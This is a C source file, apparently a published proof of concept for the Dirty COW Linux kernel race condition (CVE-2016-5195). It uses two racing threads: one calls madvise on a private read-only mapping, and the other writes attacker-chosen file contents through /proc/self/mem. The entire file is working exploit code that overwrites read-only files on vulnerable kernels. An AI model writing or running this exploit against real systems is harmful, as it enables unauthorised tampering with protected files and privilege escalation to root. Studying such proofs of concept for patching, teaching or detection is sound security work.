/**
 * 
 * CVE-2016-5195
 * dirty C-O-W
 * poc by arttnba3
 * 2021.4.14
 *  
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

struct stat dst_st, fk_st;
void * map;
char *fake_content;

void * madviseThread(void * argv);
void * writeThread(void * argv);

int main(int argc, char ** argv)
{
    if (argc < 3)
    {
        puts("usage: ./poc destination_file fake_file");
        return 0;
    }

    pthread_t write_thread, madvise_thread;

    int dst_fd, fk_fd;
    dst_fd = open(argv[1], O_RDONLY);
    fk_fd = open(argv[2], O_RDONLY);
    printf("fd of dst: %d\nfd of fk: %d\n", dst_fd, fk_fd);

    fstat(dst_fd, &dst_st); // get destination file length
    fstat(fk_fd, &fk_st); // get fake file length
    map = mmap(NULL, dst_st.st_size, PROT_READ, MAP_PRIVATE, dst_fd, 0);

    fake_content = malloc(fk_st.st_size);
    read(fk_fd, fake_content, fk_st.st_size);

    pthread_create(&madvise_thread, NULL, madviseThread, NULL);
    pthread_create(&write_thread, NULL, writeThread, NULL);

    pthread_join(madvise_thread, NULL);
    pthread_join(write_thread, NULL);

    return 0;
}

void * writeThread(void * argv)
{
    int mm_fd = open("/proc/self/mem", O_RDWR);
    printf("fd of mem: %d\n", mm_fd);
    for (int i = 0; i < 0x100000; i++)
    {
        lseek(mm_fd, (off_t) map, SEEK_SET);
        write(mm_fd, fake_content, fk_st.st_size);
    }

    return NULL;
}

void * madviseThread(void * argv)
{
    for (int i = 0; i < 0x100000; i++){
        madvise(map, 0x100, MADV_DONTNEED);
    }

    return NULL;
}
